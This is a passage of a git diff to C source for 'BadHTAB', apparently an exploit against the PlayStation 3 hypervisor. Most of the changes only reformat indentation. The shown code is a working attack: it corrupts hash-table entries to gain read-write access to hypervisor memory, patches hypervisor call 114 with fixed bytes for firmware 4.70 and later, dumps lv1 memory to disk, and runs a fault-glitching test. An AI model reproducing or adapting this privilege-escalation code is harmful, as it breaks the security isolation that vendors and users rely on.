-                       CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
-                       lpar_addr, SPECIAL_RA_FLAGS_READWRITE);
+		htabe_set_lpar(&htabe,
+					   CALC_SPECIAL_VA(SPECIAL_VA, htab_idx), SPECIAL_VA_FLAGS_VALID,
+					   lpar_addr, SPECIAL_RA_FLAGS_READWRITE);
 
-        res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);
+		res = lv1_write_htab_entry(0, htab_idx, htabe.Num[0], htabe.Num[1]);
 
-        if (res != 0)
-        {
-            PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
-                     htab_idx, htabe.Num[0], htabe.Num[1], res);
+		if (res != 0)
+		{
+			PrintLog("lv1_write_htab_entry failed, htab_idx = %u, num0 = %lx, num1 = %lx, res = %d\n",
+					 htab_idx, htabe.Num[0], htabe.Num[1], res);
 
-            abort();
-        }
-    }
+			abort();
+		}
+	}
 
-    res = lv1_release_memory(lpar_addr);
+	res = lv1_release_memory(lpar_addr);
 
-    if (res != 0)
-    {
-        PrintLog("lv1_release_memory failed, res = %d\n", res);
+	if (res != 0)
+	{
+		PrintLog("lv1_release_memory failed, res = %d\n", res);
 
-        abort();
-        return;
-    }
+		abort();
+		return;
+	}
 
-    {
-        HTABE htabe;
+	{
+		HTABE htabe;
 
-        lv2_read(CalcHTAB_EA_Addr_By_HtabIdx(old_htab_ea, htab_idx), sizeof(HTABE), &htabe);
-        PrintSingleHTAB(&htabe);
+		lv2_read(CalcHTAB_EA_Addr_By_HtabIdx(old_htab_ea, htab_idx), sizeof(HTABE), &htabe);
+		PrintSingleHTAB(&htabe);
 
-        htabe.V = 1;
-        lv2_write(CalcHTAB_EA_Addr_By_HtabIdx(old_htab_ea, htab_idx), sizeof(HTABE), &htabe);
-        PrintSingleHTAB(&htabe);
-    }
+		htabe.V = 1;
+		lv2_write(CalcHTAB_EA_Addr_By_HtabIdx(old_htab_ea, htab_idx), sizeof(HTABE), &htabe);
+		PrintSingleHTAB(&htabe);
+	}
 
-    res = lv1_unmap_htab(old_htab_lpar_addr);
+	res = lv1_unmap_htab(old_htab_lpar_addr);
 
-    if (res != 0)
-    {
-        PrintLog("lv1_unmap_htab failed!!!, res = %d\n", res);
+	if (res != 0)
+	{
+		PrintLog("lv1_unmap_htab failed!!!, res = %d\n", res);
 
-        abort();
-        return;
-    }
+		abort();
+		return;
+	}
 
-    PrintLog("Bad HTAB Idx = %u, htab_idx = %u\n", FindBadHTABIdx(), htab_idx);
+	PrintLog("Bad HTAB Idx = %u, htab_idx = %u\n", FindBadHTABIdx(), htab_idx);
 
-    PrintLog("Stage1_CFW done\n");
+	PrintLog("Stage1_CFW done\n");
 }
 
 // offset in bytes:
@@ -655,9 +655,9 @@ void Stage1_CFW()
 struct DMMR_s
 {
 public:
-    uint64_t ra;
-    uint64_t size;
-    uint64_t lpar_addr;
+	uint64_t ra;
+	uint64_t size;
+	uint64_t lpar_addr;
 };
 
 static const uint32_t dmmr_count = 512;
@@ -665,338 +665,239 @@ DMMR_s dmmrs[dmmr_count];
 
 void Stage2_114()
 {
-    PrintLog("Stage2_114()\n");
+	PrintLog("Stage2_114()\n");
 
-#if 0
-    if (IsExploited())
-    {
-        PrintLog("Already exploited, skipping...\n");
-        return;
-    }
+#if 1
+	if (IsExploited())
+	{
+		PrintLog("Already exploited, skipping...\n");
+		return;
+	}
 #endif
 
-    int32_t res;
+	int32_t res;
 
-    PrintLog("Allocating dmmrs\n");
+	PrintLog("Allocating dmmrs\n");
 
-    for (uint32_t i = 0; i < dmmr_count; i++)
-    {
-        DMMR_s *dmmr = &dmmrs[i];
+	for (uint32_t i = 0; i < dmmr_count; i++)
+	{
+		DMMR_s *dmmr = &dmmrs[i];
 
-        dmmr->ra = 0x28080000000ul + (i * 4096);
-        // dmmr->size = 4096;
-        dmmr->size = 0;
-        dmmr->lpar_addr = 0;
+		dmmr->ra = 0x28080000000ul + (i * 4096);
+		// dmmr->size = 4096;
+		dmmr->size = 0;
+		dmmr->lpar_addr = 0;
 
-        res = lv1_map_physical_address_region(dmmr->ra, EXP_4KB, dmmr->size, &dmmr->lpar_addr);
+		res = lv1_map_physical_address_region(dmmr->ra, EXP_4KB, dmmr->size, &dmmr->lpar_addr);
 
-        if (res != 0)
-        {
-            PrintLog("lv1_map_physical_address_region failed!!!, res = %d\n", res);
+		if (res != 0)
+		{
+			PrintLog("lv1_map_physical_address_region failed!!!, res = %d\n", res);
 
-            dmmr->lpar_addr = 0;
-            break;
-        }
+			dmmr->lpar_addr = 0;
+			break;
+		}
 
-        PrintLog("dmmr %u, ra = 0x%lx, size = %lu, lpar_addr = 0x%lx\n", i, dmmr->ra, dmmr->size, dmmr->lpar_addr);
-    }
+		PrintLog("dmmr %u, ra = 0x%lx, size = %lu, lpar_addr = 0x%lx\n", i, dmmr->ra, dmmr->size, dmmr->lpar_addr);
+	}
 
-    //
+	//
 
-    uint32_t htab_idx = FindBadHTABIdx();
+	uint32_t htab_idx = FindBadHTABIdx();
 
-    HTABE htabe;
-    lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
+	HTABE htabe;
+	lv2_read(CalcGameOSHTAB_EA_Addr_By_HtabIdx(htab_idx), sizeof(HTABE), &htabe);
 
-    uint64_t htabe_ra = HTABE_GET_RA(htabe);
+	uint64_t htabe_ra = HTABE_GET_RA(htabe);
 
-    PrintLog("bad htab_idx = %u, ra = 0x%lx\n", htab_idx, htabe_ra);
+	PrintLog("bad htab_idx = %u, ra = 0x%lx\n", htab_idx, htabe_ra);
 
-    //
+	//
 
-    uint64_t *our_rw = (uint64_t *)CALC_SPECIAL_EA(SPECIAL_EA, htab_idx, htabe);
-    // uint8_t* our_rw_u8 = (uint8_t*)our_rw;
+	uint64_t *our_rw = (uint64_t *)CALC_SPECIAL_EA(SPECIAL_EA, htab_idx, htabe);
+	// uint8_t* our_rw_u8 = (uint8_t*)our_rw;
 
-    PrintLog("Checking for overlap...\n");
+	PrintLog("Checking for overlap...\n");
 
-    static const uint32_t need_overlap_dmmi_count = 2;
+	static const uint32_t need_overlap_dmmi_count = 2;
 
-    uint32_t found = 0;
+	uint32_t found = 0;
 
-    uint64_t found_i[need_overlap_dmmi_count];
+	uint64_t found_i[need_overlap_dmmi_count];
 
-    DMMR_s *found_overlap_dmmr[need_overlap_dmmi_count];
-    uint32_t found_overlap_dmmr_i[need_overlap_dmmi_count];
+	DMMR_s *found_overlap_dmmr[need_overlap_dmmi_count];
+	uint32_t found_overlap_dmmr_i[need_overlap_dmmi_count];
 
-    for (uint32_t i = 0; i < need_overlap_dmmi_count; i++)
-    {
-        found_i[i] = 0;
+	for (uint32_t i = 0; i < need_overlap_dmmi_count; i++)
+	{
+		found_i[i] = 0;
 
-        found_overlap_dmmr[i] = NULL;
-        found_overlap_dmmr_i[i] = 0;
-    }
+		found_overlap_dmmr[i] = NULL;
+		found_overlap_dmmr_i[i] = 0;
+	}
 
-    for (uint64_t i = 12; i < 4096 / 8; i++)
-    {
-        slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
-        uint64_t v = our_rw[i];
-        slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
-        uint64_t vsize = our_rw[i - 10];
-        slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
-        uint64_t vlpar = our_rw[i + 11];
+	for (uint64_t i = 12; i < 4096 / 8; i++)
+	{
+		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
+		uint64_t v = our_rw[i];
+		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
+		uint64_t vsize = our_rw[i - 10];
+		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
+		uint64_t vlpar = our_rw[i + 11];
 
-        // PrintLog("v = %lx\n", v);
+		// PrintLog("v = %lx\n", v);
 
-        for (uint32_t i2 = 0; i2 < dmmr_count; i2++)
-        {
-            DMMR_s *dmmr = &dmmrs[i2];
+		for (uint32_t i2 = 0; i2 < dmmr_count; i2++)
+		{
+			DMMR_s *dmmr = &dmmrs[i2];
 
-            if (dmmr->lpar_addr == 0)
-                continue;
+			if (dmmr->lpar_addr == 0)
+				continue;
 
-            if ((v == dmmr->ra) && (vsize == dmmr->size) && (vlpar == dmmr->lpar_addr))
-            {
-                found_i[found] = i;
+			if ((v == dmmr->ra) && (vsize == dmmr->size) && (vlpar == dmmr->lpar_addr))
+			{
+				found_i[found] = i;
 
-                found_overlap_dmmr[found] = dmmr;
-                found_overlap_dmmr_i[found] = i2;
+				found_overlap_dmmr[found] = dmmr;
+				found_overlap_dmmr_i[found] = i2;
 
-                found++;
-                break;
-            }
-        }
+				found++;
+				break;
+			}
+		}
 
-        if (found == need_overlap_dmmi_count)
-            break;
-    }
+		if (found == need_overlap_dmmi_count)
+			break;
+	}
 
-    if (found != need_overlap_dmmi_count)
-    {
-        PrintLog("Not found, abort!\n");
+	if (found != need_overlap_dmmi_count)
+	{
+		PrintLog("Not found, abort!\n");
 
-        PrintLog("Cleanup...\n");
+		PrintLog("Cleanup...\n");
 
-        for (uint32_t i = 0; i < dmmr_count; i++)
-        {
-            DMMR_s *dmmr = &dmmrs[i];
+		for (uint32_t i = 0; i < dmmr_count; i++)
+		{
+			DMMR_s *dmmr = &dmmrs[i];
 
-            if (dmmr->lpar_addr == 0)
-                continue;
+			if (dmmr->lpar_addr == 0)
+				continue;
 
-            res = lv1_unmap_physical_address_region(dmmr->lpar_addr);
+			res = lv1_unmap_physical_address_region(dmmr->lpar_addr);
 
-            if (res != 0)
-            {
-                PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
+			if (res != 0)
+			{
+				PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
 
-                abort();
-                return;
-            }
-        }
+				abort();
+				return;
+			}
+		}
 
-        abort();
-        return;
-    }
+		abort();
+		return;
+	}
 
-    for (uint32_t i = 0; i < need_overlap_dmmi_count; i++)
-    {
-        DMMR_s *d = found_overlap_dmmr[i];
+	for (uint32_t i = 0; i < need_overlap_dmmi_count; i++)
+	{
+		DMMR_s *d = found_overlap_dmmr[i];
 
-        PrintLog("Found!, %lu, dmmr %u, ra = 0x%lx, size = %lu, lpar_addr = 0x%lx\n",
-                 found_i[i], found_overlap_dmmr_i[i], d->ra, d->size, d->lpar_addr);
-    }
+		PrintLog("Found!, %lu, dmmr %u, ra = 0x%lx, size = %lu, lpar_addr = 0x%lx\n",
+				 found_i[i], found_overlap_dmmr_i[i], d->ra, d->size, d->lpar_addr);
+	}
 
-    //
+	//
 
-    PrintLog("Cleanup unneeded dmmrs ...\n");
+	PrintLog("Cleanup unneeded dmmrs ...\n");
 
-    for (uint32_t i = 0; i < dmmr_count; i++)
-    {
-        DMMR_s *dmmr = &dmmrs[i];
+	for (uint32_t i = 0; i < dmmr_count; i++)
+	{
+		DMMR_s *dmmr = &dmmrs[i];
 
-        if (dmmr->lpar_addr == 0)
-            continue;
+		if (dmmr->lpar_addr == 0)
+			continue;
 
-        bool skip = false;
+		bool skip = false;
 
-        for (uint32_t i2 = 0; i2 < need_overlap_dmmi_count; i2++)
-        {
-            if (dmmr == found_overlap_dmmr[i2])
-            {
-                skip = true;
-                break;
-            }
-        }
+		for (uint32_t i2 = 0; i2 < need_overlap_dmmi_count; i2++)
+		{
+			if (dmmr == found_overlap_dmmr[i2])
+			{
+				skip = true;
+				break;
+			}
+		}
 
-        if (skip)
-            continue;
+		if (skip)
+			continue;
 
-        res = lv1_unmap_physical_address_region(dmmr->lpar_addr);
+		res = lv1_unmap_physical_address_region(dmmr->lpar_addr);
 
-        if (res != 0)
-        {
-            PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
+		if (res != 0)
+		{
+			PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
 
-            abort();
-            return;
-        }
+			abort();
+			return;
+		}
 
-        dmmr->lpar_addr = 0;
-    }
+		dmmr->lpar_addr = 0;
+	}
 
-    PrintLog("Cleanup done\n");
+	PrintLog("Cleanup done\n");
 
-    // patch hvcall 114, map everywhere
+	// patch hvcall 114, map everywhere
 
-    // < 2F 80 00 00 41 9E 00 28 38 60 00 00 38 80 00 00
-    // ---
-    // > 60 00 00 00 48 00 00 28 38 60 00 00 38 80 00 00
+	// < 2F 80 00 00 41 9E 00 28 38 60 00 00 38 80 00 00
+	// ---
+	// > 60 00 00 00 48 00 00 28 38 60 00 00 38 80 00 00
 
-    {
-        static const uint32_t iidx = 0;
+	{
+		static const uint32_t iidx = 0;
 
-        uint64_t want_ra = 0;
+		uint64_t want_ra = 0;
 
-        if (fwVersion >= 4.70)
-            want_ra = 0x2DCF54;
-        else
-        {
-            PrintLog("firmware not supported!!!\n");
+		if (fwVersion >= 4.70)
+			want_ra = 0x2DCF54;
+		else
+		{
+			PrintLog("firmware not supported!!!\n");
 
-            abort();
-            return;
-        }
+			abort();
+			return;
+		}
 
-        uint64_t want_offset = (want_ra % 4096);
+		uint64_t want_offset = (want_ra % 4096);
 
-        PrintLog("want_ra = 0x%lx, want_offset = %lu\n", want_ra, want_offset);
+		PrintLog("want_ra = 0x%lx, want_offset = %lu\n", want_ra, want_offset);
 
-        //
+		//
 
-        uint64_t patched_ra = (want_ra - want_offset); // can be ANY address you want, must be 4096 aligned
-        uint64_t patched_size = 4096;                  // this is maximum we can do
+		uint64_t patched_ra = (want_ra - want_offset); // can be ANY address you want, must be 4096 aligned
+		uint64_t patched_size = 4096;				   // this is maximum we can do
 
-        slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
-        our_rw[found_i[iidx]] = patched_ra;
-        slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
-        our_rw[found_i[iidx] - 10] = patched_size;
+		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
+		our_rw[found_i[iidx]] = patched_ra;
+		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
+		our_rw[found_i[iidx] - 10] = patched_size;
 
-        if (htab_ra_from_lpar(found_overlap_dmmr[iidx]->lpar_addr) != patched_ra)
-        {
-            PrintLog("patch ra failed!!! abort()\n");
+		if (htab_ra_from_lpar(found_overlap_dmmr[iidx]->lpar_addr) != patched_ra)
+		{
+			PrintLog("patch ra failed!!! abort()\n");
 
-            abort();
-            return;
-        }
+			abort();
+			return;
+		}
 
-        PrintLog("patched ra = 0x%lx, size = %lu\n", patched_ra, patched_size);
+		PrintLog("patched ra = 0x%lx, size = %lu\n", patched_ra, patched_size);
 
-        found_overlap_dmmr[iidx]->ra = patched_ra;
-        found_overlap_dmmr[iidx]->size = patched_size;
+		found_overlap_dmmr[iidx]->ra = patched_ra;
+		found_overlap_dmmr[iidx]->size = patched_size;
 
-        //
+		//
 
-        uint64_t dest_ea = 0x8000000014000000ul;
-        map_lpar_to_lv2_ea(found_overlap_dmmr[iidx]->lpar_addr, dest_ea, patched_size, false, false);
-
-#if 0
-
-        for (uint64_t i = 0; i < 4096 / 8; i++)
-        {
-            uint64_t v;
-            lv2_read(dest_ea + (i * 8), 8, &v);
-
-            PrintLog("%lu, 0x%lx\n", i, v);
-        }
-
-#endif
-
-        PrintLog("Patching hvcall 114 now!!!\n");
-
-        {
-            // 2F 80 00 00 41 9E 00 28
-
-            uint64_t old;
-            lv2_read(dest_ea + want_offset, 8, &old);
-
-            PrintLog("old = 0x%lx\n", old);
-
-            // 60 00 00 00 48 00 00 28
-
-            uint64_t newval = 0x6000000048000028;
-            lv2_write(dest_ea + want_offset, 8, &newval);
-
-            PrintLog("new = 0x%lx\n", newval);
-
-            //
-
-            uint64_t newval2;
-            lv2_read(dest_ea + want_offset, 8, &newval2);
-
-            PrintLog("new2 = 0x%lx\n", newval2);
-        }
-
-        res = lv1_unmap_physical_address_region(found_overlap_dmmr[iidx]->lpar_addr);
-
-        if (res != 0)
-        {
-            PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
-
-            abort();
-            return;
-        }
-
-        found_overlap_dmmr[iidx]->lpar_addr = 0;
-    }
-
-    // part 2
-
-    {
-        static const uint32_t iidx = 1;
-
-        uint64_t want_ra = 0;
-
-        if (fwVersion >= 4.70)
-            want_ra = 0x2DD287;
-        else
-        {
-            PrintLog("firmware not supported!!!\n");
-
-            abort();
-            return;
-        }
-
-        uint64_t want_offset = (want_ra % 4096);
-
-        PrintLog("want_ra = 0x%lx, want_offset = %lu\n", want_ra, want_offset);
-
-        //
-
-        uint64_t patched_ra = (want_ra - want_offset); // can be ANY address you want, must be 4096 aligned
-        uint64_t patched_size = 4096;                  // this is maximum we can do
-
-        slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
-        our_rw[found_i[iidx]] = patched_ra;
-        slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
-        our_rw[found_i[iidx] - 10] = patched_size;
-
-        if (htab_ra_from_lpar(found_overlap_dmmr[iidx]->lpar_addr) != patched_ra)
-        {
-            PrintLog("patch ra failed!!! abort()\n");
-
-            abort();
-            return;
-        }
-
-        PrintLog("patched ra = 0x%lx, size = %lu\n", patched_ra, patched_size);
-
-        found_overlap_dmmr[iidx]->ra = patched_ra;
-        found_overlap_dmmr[iidx]->size = patched_size;
-
-        //
-
-        uint64_t dest_ea = 0x8000000014000000ul;
-        map_lpar_to_lv2_ea(found_overlap_dmmr[iidx]->lpar_addr, dest_ea, patched_size, false, false);
+		uint64_t dest_ea = 0x8000000014000000ul;
+		map_lpar_to_lv2_ea(found_overlap_dmmr[iidx]->lpar_addr, dest_ea, patched_size, false, false);
 
 #if 0
 
@@ -1010,163 +911,262 @@ void Stage2_114()
 
 #endif
 
-        PrintLog("Patching hvcall 114 part 2 now!!!\n");
+		PrintLog("Patching hvcall 114 now!!!\n");
 
+		{
+			// 2F 80 00 00 41 9E 00 28
+
+			uint64_t old;
+			lv2_read(dest_ea + want_offset, 8, &old);
+
+			PrintLog("old = 0x%lx\n", old);
+
+			// 60 00 00 00 48 00 00 28
+
+			uint64_t newval = 0x6000000048000028;
+			lv2_write(dest_ea + want_offset, 8, &newval);
+
+			PrintLog("new = 0x%lx\n", newval);
+
+			//
+
+			uint64_t newval2;
+			lv2_read(dest_ea + want_offset, 8, &newval2);
+
+			PrintLog("new2 = 0x%lx\n", newval2);
+		}
+
+		res = lv1_unmap_physical_address_region(found_overlap_dmmr[iidx]->lpar_addr);
+
+		if (res != 0)
+		{
+			PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
+
+			abort();
+			return;
+		}
+
+		found_overlap_dmmr[iidx]->lpar_addr = 0;
+	}
+
+	// part 2
+
+	{
+		static const uint32_t iidx = 1;
+
+		uint64_t want_ra = 0;
+
+		if (fwVersion >= 4.70)
+			want_ra = 0x2DD287;
+		else
+		{
+			PrintLog("firmware not supported!!!\n");
+
+			abort();
+			return;
+		}
+
+		uint64_t want_offset = (want_ra % 4096);
+
+		PrintLog("want_ra = 0x%lx, want_offset = %lu\n", want_ra, want_offset);
+
+		//
+
+		uint64_t patched_ra = (want_ra - want_offset); // can be ANY address you want, must be 4096 aligned
+		uint64_t patched_size = 4096;				   // this is maximum we can do
+
+		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
+		our_rw[found_i[iidx]] = patched_ra;
+		slb_add_segment(SPECIAL_EA, HTABE_GET_VA(htabe), SLBE_KP);
+		our_rw[found_i[iidx] - 10] = patched_size;
+
+		if (htab_ra_from_lpar(found_overlap_dmmr[iidx]->lpar_addr) != patched_ra)
+		{
+			PrintLog("patch ra failed!!! abort()\n");
+
+			abort();
+			return;
+		}
+
+		PrintLog("patched ra = 0x%lx, size = %lu\n", patched_ra, patched_size);
+
+		found_overlap_dmmr[iidx]->ra = patched_ra;
+		found_overlap_dmmr[iidx]->size = patched_size;
+
+		//
+
+		uint64_t dest_ea = 0x8000000014000000ul;
+		map_lpar_to_lv2_ea(found_overlap_dmmr[iidx]->lpar_addr, dest_ea, patched_size, false, false);
+
+#if 0
+
+        for (uint64_t i = 0; i < 4096 / 8; i++)
         {
-            // 00 4B FF FB FD 7C 60 1B
+            uint64_t v;
+            lv2_read(dest_ea + (i * 8), 8, &v);
 
-            uint64_t old;
-            lv2_read(dest_ea + want_offset, 8, &old);
-
-            PrintLog("old = 0x%lx\n", old);
-
-            // 01 4B FF FB FD 7C 60 1B
-
-            uint64_t newval = 0x014BFFFBFD7C601B;
-            lv2_write(dest_ea + want_offset, 8, &newval);
-
-            PrintLog("new = 0x%lx\n", newval);
-
-            //
-
-            uint64_t newval2;
-            lv2_read(dest_ea + want_offset, 8, &newval2);
-
-            PrintLog("new2 = 0x%lx\n", newval2);
+            PrintLog("%lu, 0x%lx\n", i, v);
         }
 
-        res = lv1_unmap_physical_address_region(found_overlap_dmmr[iidx]->lpar_addr);
+#endif
 
-        if (res != 0)
-        {
-            PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
+		PrintLog("Patching hvcall 114 part 2 now!!!\n");
 
-            abort();
-            return;
-        }
+		{
+			// 00 4B FF FB FD 7C 60 1B
 
-        found_overlap_dmmr[iidx]->lpar_addr = 0;
-    }
+			uint64_t old;
+			lv2_read(dest_ea + want_offset, 8, &old);
 
-    PrintLog("Patch done!!!\n");
+			PrintLog("old = 0x%lx\n", old);
 
-    // cleanup...
+			// 01 4B FF FB FD 7C 60 1B
 
-    PrintLog("Cleanup...\n");
+			uint64_t newval = 0x014BFFFBFD7C601B;
+			lv2_write(dest_ea + want_offset, 8, &newval);
 
-    for (uint32_t i = 0; i < dmmr_count; i++)
-    {
-        DMMR_s *dmmr = &dmmrs[i];
+			PrintLog("new = 0x%lx\n", newval);
 
-        if (dmmr->lpar_addr == 0)
-            continue;
+			//
 
-        res = lv1_unmap_physical_address_region(dmmr->lpar_addr);
+			uint64_t newval2;
+			lv2_read(dest_ea + want_offset, 8, &newval2);
 
-        if (res != 0)
-        {
-            PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
+			PrintLog("new2 = 0x%lx\n", newval2);
+		}
 
-            abort();
-            return;
-        }
-    }
+		res = lv1_unmap_physical_address_region(found_overlap_dmmr[iidx]->lpar_addr);
 
-    eieio();
-    isync();
+		if (res != 0)
+		{
+			PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
 
-    PrintLog("Done!\n");
+			abort();
+			return;
+		}
+
+		found_overlap_dmmr[iidx]->lpar_addr = 0;
+	}
+
+	PrintLog("Patch done!!!\n");
+
+	// cleanup...
+
+	PrintLog("Cleanup...\n");
+
+	for (uint32_t i = 0; i < dmmr_count; i++)
+	{
+		DMMR_s *dmmr = &dmmrs[i];
+
+		if (dmmr->lpar_addr == 0)
+			continue;
+
+		res = lv1_unmap_physical_address_region(dmmr->lpar_addr);
+
+		if (res != 0)
+		{
+			PrintLog("lv1_unmap_physical_address_region failed!!!, res = %d\n", res);
+
+			abort();
+			return;
+		}
+	}
+
+	eieio();
+	isync();
+
+	PrintLog("Done!\n");
 }
 
 void DumpLv2Lv1()
 {
-    PrintLog("Dumping lv1 through lv2 to /dev_hdd0/lv2_lv1dump.bin ...\n");
+	PrintLog("Dumping lv1 through lv2 to /dev_hdd0/lv2_lv1dump.bin ...\n");
 
-    lv2_beep_triple();
+	lv2_beep_triple();
 
-    FILE *f = fopen("/dev_hdd0/lv2_lv1dump.bin", "wb");
+	FILE *f = fopen("/dev_hdd0/lv2_lv1dump.bin", "wb");
 
-    size_t dumpSize = 16 * 1024 * 1024;
-    uint64_t dumpAddr = 0;
+	size_t dumpSize = 16 * 1024 * 1024;
+	uint64_t dumpAddr = 0;
 
-    void *buf = malloc(dumpSize);
+	void *buf = malloc(dumpSize);
 
-    lv2_lv1_read(dumpAddr, dumpSize, buf);
+	lv2_lv1_read(dumpAddr, dumpSize, buf);
 
-    fwrite(buf, 1, dumpSize, f);
+	fwrite(buf, 1, dumpSize, f);
 
-    free(buf);
+	free(buf);
 
-    fflush(f);
-    fclose(f);
+	fflush(f);
+	fclose(f);
 
-    PrintLog("dump done.\n");
+	PrintLog("dump done.\n");
 
-    lv2_beep_single();
+	lv2_beep_single();
 }
 
 void DumpLv1()
 {
-    PrintLog("Dumping lv1 to /dev_hdd0/lv1dump.bin ... This may take few minutes......\n");
+	PrintLog("Dumping lv1 to /dev_hdd0/lv1dump.bin ... This may take few minutes......\n");
 
-    lv2_beep_long();
+	lv2_beep_long();
 
-    FILE *f = fopen("/dev_hdd0/lv1dump.bin", "wb");
+	FILE *f = fopen("/dev_hdd0/lv1dump.bin", "wb");
 
-    size_t dumpSize = 16 * 1024 * 1024;
-    uint64_t dumpAddr = 0;
+	size_t dumpSize = 16 * 1024 * 1024;
+	uint64_t dumpAddr = 0;
 
-    void *buf = malloc(dumpSize);
+	void *buf = malloc(dumpSize);
 
-    lv1_read(dumpAddr, dumpSize, buf);
+	lv1_read(dumpAddr, dumpSize, buf);
 
-    fwrite(buf, 1, dumpSize, f);
+	fwrite(buf, 1, dumpSize, f);
 
-    free(buf);
+	free(buf);
 
-    fflush(f);
-    fclose(f);
+	fflush(f);
+	fclose(f);
 
-    PrintLog("dump done.\n");
+	PrintLog("dump done.\n");
 
-    lv2_beep_single();
+	lv2_beep_single();
 }
 
 void GlitcherTest()
 {
-    PrintLog("GlitcherTest()\n");
+	PrintLog("GlitcherTest()\n");
 
-    Glitcher_Init();
+	Glitcher_Init();
 
-    bool success = false;
+	bool success = false;
 
-    uint64_t size = 1 * 1024 * 1024;
-    uint8_t *mem = (uint8_t *)malloc(size);
+	uint64_t size = 1 * 1024 * 1024;
+	uint8_t *mem = (uint8_t *)malloc(size);
 
-    PrintLog("mem = 0x%lx, size = %lu\n", (uint64_t)mem, size);
+	PrintLog("mem = 0x%lx, size = %lu\n", (uint64_t)mem, size);
 
-    uint64_t loopCount = 0;
+	uint64_t loopCount = 0;
 
-    while (1)
-    {
-        PrintLog("loopCount = %lu\n", loopCount);
-        lv2_beep_single();
+	while (1)
+	{
+		PrintLog("loopCount = %lu\n", loopCount);
+		lv2_beep_single();
 
-        PrintLog("Writing stage1...\n");
+		PrintLog("Writing stage1...\n");
 
-        for (uint64_t i = 0; i < size; i++)
-        {
-            uint64_t addr = (uint64_t)&mem[i];
-            uint8_t v = (addr % 255);
+		for (uint64_t i = 0; i < size; i++)
+		{
+			uint64_t addr = (uint64_t)&mem[i];
+			uint8_t v = (addr % 255);
 
-            mem[i] = v;
-        }
+			mem[i] = v;
+		}
 
-        eieio();
+		eieio();
 
-        PrintLog("Writing memory...\n");
+		PrintLog("Writing memory...\n");
 
-        uint64_t writeCount = 0;
+		uint64_t writeCount = 0;
 
 #if 0
 
@@ -1202,116 +1202,116 @@ void GlitcherTest()
 
 #else
 
-        Glitcher_Start();
-        uint64_t t1 = GetTimeInUs();
+		Glitcher_Start();
+		uint64_t t1 = GetTimeInUs();
 
-        lv2_glitcher_test((uint64_t)mem, size, &writeCount);
+		lv2_glitcher_test((uint64_t)mem, size, &writeCount);
 
-        uint64_t t2 = GetTimeInUs();
-        Glitcher_Stop();
+		uint64_t t2 = GetTimeInUs();
+		Glitcher_Stop();
 
 #endif
 
-        PrintLog("writeCount = %lu, delta = %luus\n", writeCount, (t2 - t1));
+		PrintLog("writeCount = %lu, delta = %luus\n", writeCount, (t2 - t1));
 
-        PrintLog("Checking memory...\n");
+		PrintLog("Checking memory...\n");
 
-        for (uint64_t i = 0; i < size; i++)
-        {
-            uint64_t addr = (uint64_t)&mem[i];
+		for (uint64_t i = 0; i < size; i++)
+		{
+			uint64_t addr = (uint64_t)&mem[i];
 
-            uint8_t v = mem[i];
+			uint8_t v = mem[i];
 
-            // uint8_t expected_v = (i < writeCount) ? (255 - (addr % 255)) : (addr % 255);
-            uint8_t expected_v = 0x69;
+			// uint8_t expected_v = (i < writeCount) ? (255 - (addr % 255)) : (addr % 255);
+			uint8_t expected_v = 0x69;
 
-            if (v != expected_v)
-            {
-                PrintLog("Corruption found!, addr = 0x%lx, offset = %lu, v = 0x%x, expected_v = 0x%x\n", addr, i, (uint32_t)v, (uint32_t)expected_v);
+			if (v != expected_v)
+			{
+				PrintLog("Corruption found!, addr = 0x%lx, offset = %lu, v = 0x%x, expected_v = 0x%x\n", addr, i, (uint32_t)v, (uint32_t)expected_v);
 
-                success = true;
-            }
-        }
+				success = true;
+			}
+		}
 
-        if (success)
-        {
-            lv2_beep_triple();
-            break;
-        }
+		if (success)
+		{
+			lv2_beep_triple();
+			break;
+		}
 
-        loopCount++;
+		loopCount++;
 
-        WaitInMs(500);
-    }
+		WaitInMs(500);
+	}
 
-    free(mem);
+	free(mem);
 
-    Glitcher_Destroy();
+	Glitcher_Destroy();
 }
 
 int main(int argc, char *argv[])
 {
-    lv2_beep_triple();
+	lv2_beep_triple();
 
-    InitLogging();
+	InitLogging();
 
-    PrintLog("BadHTAB by Kafuu(aomsin2526)\n");
+	PrintLog("BadHTAB by Kafuu(aomsin2526)\n");
 
-    {
-        FILE *fp;
-        fp = fopen("/dev_flash/vsh/etc/version.txt", "rb");
+	{
+		FILE *fp;
+		fp = fopen("/dev_flash/vsh/etc/version.txt", "rb");
 
-        if (fp != NULL)
-        {
-            char bufs[1024];
+		if (fp != NULL)
+		{
+			char bufs[1024];
 
-            fgets(bufs, 1024, fp);
-            fclose(fp);
+			fgets(bufs, 1024, fp);
+			fclose(fp);
 
